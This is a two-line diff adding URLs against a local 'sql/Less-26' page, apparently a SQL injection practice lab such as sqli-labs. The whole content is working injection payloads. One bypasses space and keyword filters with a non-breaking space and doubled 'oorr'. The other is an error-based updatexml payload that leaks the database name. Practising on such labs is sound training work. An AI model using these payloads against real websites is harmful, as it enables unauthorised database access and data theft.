@@ -1,0 +1,2 @@
+http://127.0.0.1/sql/Less-26/?id=1%27%C2%A0oorr%C2%A0%271%27=%271
+http://127.0.0.1/sql/Less-26/?id=1%27oorr(updatexml(1,concat(0x7e,database(),0x7e),1))oorr%271%27=%271 <<<
